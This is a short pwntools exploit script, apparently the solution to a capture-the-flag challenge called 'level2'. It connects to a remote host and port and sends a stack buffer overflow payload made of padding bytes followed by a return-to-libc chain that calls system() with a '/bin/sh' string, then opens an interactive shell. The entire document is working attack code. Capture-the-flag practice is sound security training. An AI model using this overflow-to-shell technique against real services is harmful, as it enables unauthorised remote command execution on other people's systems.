from pwn import *

# p = process("./level2")
p = remote("111.198.29.45" , 30878)
elf = ELF("./level2")

str_bin_sh = 0x0804A024 # hint # /bin/sh\x00
payload = "a" * 0x88 + "b" * 4 
payload += p32(elf.plt["system"]) + p32(0) + p32(str_bin_sh)
p.sendafter("t:\n" , payload)

p.interactive()